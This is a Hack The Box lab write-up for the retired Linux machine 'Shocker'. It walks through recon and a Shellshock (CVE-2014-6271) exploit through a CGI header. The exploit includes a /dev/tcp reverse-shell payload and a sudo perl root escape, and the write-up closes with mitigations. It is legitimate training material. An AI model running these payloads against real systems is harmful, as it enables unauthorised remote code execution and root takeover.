---
machine: Shocker
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, shellshock, cve-2014-6271, cgi, sudo, perl, gtfobins]
---

# Shocker — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Apache with CGI and a Bash script (`/cgi-bin/user.sh`) that runs `uptime`: the script's environment is built from HTTP headers, so **Shellshock (CVE-2014-6271)** yields command execution as `www-data`/`shelly`. Escalation is a passwordless `sudo` on `perl`, i.e. a GTFOBins escape.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp   open  http  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi
```

```text
/cgi-bin/            (Status: 403)
/cgi-bin/user.sh     (Status: 200)
```

```bash
curl -s http://<IP>/cgi-bin/user.sh
```

```text
Content-Type: text/plain

Just an uptime test script
 04:48:11 up 15:15, 0 users, load average: 0.05, 0.45, 0.39
```

## Access

1. **Confirm the bug** by injecting an empty function into a header:

```bash
curl -H 'User-Agent: () { :; }; echo; echo VULNERABLE' http://<IP>/cgi-bin/user.sh
```

2. **Reverse shell** with the same pattern:

```bash
nc -lvnp 4444
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"' \
  http://<IP>/cgi-bin/user.sh
```

The Nmap script works too:

```bash
nmap -sV -p80 --script http-shellshock \
  --script-args uri=/cgi-bin/user.sh,cmd='id' <IP>
```

```text
shelly@Shocker:/usr/lib/cgi-bin$
```

## Escalation

```bash
sudo -l
```

```text
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Classic GTFOBins escape:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

```text
root@Shocker:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Pitfalls

- **`/cgi-bin/` returns 403**: directory listing is off, but the specific script (`user.sh`) answers 200.
- **Right header**: Shellshock fires on any environment variable; if `User-Agent` fails, try `Referer` or `Cookie`.
- **Quoting**: keep the payload in single quotes so local Bash does not interpret it.
- **`perl` under `sudo`**: no script needed; `exec` inside the interpreter is enough.

## Lessons

- Unpatched Bash plus CGI is remote code execution: the header is the vector.
- `sudo` on an interpreter (perl, python, ruby) is root, just like on an editor.
- Mitigation: update Bash, avoid CGI, and never grant `sudo` on interpreters.
